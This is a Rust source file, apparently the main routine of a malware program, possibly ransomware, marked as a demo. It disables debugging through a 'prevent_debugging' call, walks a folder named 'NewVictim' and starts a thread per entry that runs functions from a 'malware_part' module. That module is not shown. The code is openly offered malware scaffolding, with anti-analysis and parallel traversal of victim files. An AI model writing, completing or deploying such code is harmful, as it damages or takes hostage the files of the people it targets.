#[cfg(windows)]
extern crate winapi;
extern crate rand;

use std::thread;
use walkdir::WalkDir;
mod malware_part;


fn main() {    
    // DEMO SECTION
    malware_part::prevent_debugging();
    let mut hanldes = vec![];
    let mut base_dir = "D:\\NewVictim\\";
    for entry in WalkDir::new(base_dir).max_depth(1).into_iter().filter_map(|e| e.ok()){
        println!("Started thread at folder {}",entry.clone().path().to_str().expect("failed"));
        if base_dir == entry.clone().path().to_str().expect("msg"){
            let handle = thread::spawn(move||malware_part::malware_thread(&entry.clone().path().to_str().expect("failed convert path to str")));
            hanldes.push(handle);
        }
        else{
            let handle = thread::spawn(move||malware_part::malware_thread_root(&entry.clone().path().to_str().expect("failed convert path to str")));
            hanldes.push(handle);
        }
    }
    for handle in hanldes{
        handle.join().unwrap();
    }
}
